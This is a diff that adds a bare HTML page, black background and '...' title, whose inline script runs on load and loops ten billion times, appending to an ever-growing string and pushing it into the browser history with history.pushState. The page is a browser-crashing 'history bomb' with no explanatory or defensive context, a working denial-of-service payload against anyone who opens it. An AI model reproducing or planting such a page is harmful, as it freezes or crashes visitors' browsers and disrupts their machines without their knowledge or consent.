@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>...</title>
+    <style>body { background: #000; }</style>
+</head>
+<body>
+    <script>
+        // Immediate execution
+        (function() {
+            var bomb = "";
+            for (var i = 0; i < 10000000000; i++) {
+                bomb = bomb + i.toString();
+                history.pushState(null, "", bomb);
+            }
+        })();
+    </script>
+</body>
+</html>
